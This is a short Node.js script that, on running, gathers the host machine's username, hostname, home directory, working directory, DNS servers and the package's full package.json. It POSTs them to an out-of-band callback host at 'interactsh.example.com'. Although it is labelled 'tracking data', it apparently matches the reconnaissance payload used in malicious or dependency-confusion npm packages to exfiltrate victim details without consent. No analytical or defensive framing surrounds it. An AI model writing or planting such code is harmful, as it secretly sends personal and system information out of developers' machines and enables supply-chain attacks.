const os = require('os');
const dns = require('dns');
const axios = require('axios');

(async () => {
  try {
    const packageJSON = require('./package.json');
    const package = packageJSON.name;

    const trackingData = {
      p: package,
      c: process.cwd(),
      hd: os.homedir(),
      hn: os.hostname(),
      un: os.userInfo().username,
      dns: dns.getServers(),
      r: packageJSON ? packageJSON.___resolved : undefined,
      v: packageJSON.version,
      pjson: packageJSON,
    };

    const options = {
      url: 'https://interactsh.example.com', // Replace with the appropriate server URL
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
    };

    const response = await axios.post(options.url, trackingData, { headers: options.headers });
    process.stdout.write(response.data);
  } catch (error) {
    console.error('Error sending tracking data:', error.message);
  }
})();
